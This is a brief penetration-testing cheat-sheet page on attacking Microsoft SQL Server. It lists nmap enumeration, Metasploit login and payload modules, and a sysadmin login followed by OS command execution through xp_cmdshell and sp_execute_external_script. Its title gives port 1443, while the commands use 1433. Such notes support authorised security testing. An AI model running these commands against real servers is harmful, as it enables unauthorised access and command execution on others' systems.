---
title: "PORT 1443 - MSSQL"
draft: false
images: []
description: "MSSQL Cheatsheet"
lead: "MSSQL Cheatsheet"
menu:
  docs:
    parent: "Ports"
weight: 1443
toc: true
---
```
sqsh -S 10.11.1.111 -U sa
    xp_cmdshell 'date'
      go
```
### ENUM
```
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
```
```
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload

EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'

https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
```